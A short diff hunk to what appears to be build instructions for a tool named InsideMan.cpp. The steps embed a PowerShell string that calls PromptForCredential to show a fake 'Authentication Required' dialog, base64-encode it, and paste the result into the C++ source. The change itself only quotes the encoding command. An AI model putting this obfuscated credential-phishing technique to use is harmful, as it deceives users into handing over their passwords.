@@ -18,7 +18,7 @@ $str= '$sessionCredential = $host.ui.PromptForCredential("Authentication Require
 
 2.) Translate To Base64
 
-[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+'[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))'
 
 3.) Paste Base64 Output to Base64 String In InsideMan.cpp
 
